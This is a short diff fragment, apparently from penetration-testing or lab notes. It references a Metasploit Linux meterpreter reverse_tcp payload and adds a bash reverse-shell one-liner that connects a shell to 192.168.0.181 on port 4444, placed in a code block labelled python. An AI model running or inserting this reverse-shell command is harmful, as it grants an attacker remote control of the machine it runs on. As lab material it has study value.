@@ -152,5 +152,5 @@ payload/linux/x86/meterpreter/reverse_tcp
 ```
 run
 ```python
-
+sh -i >& /dev/tcp/192.168.0.181/4444 0>&1
 ```
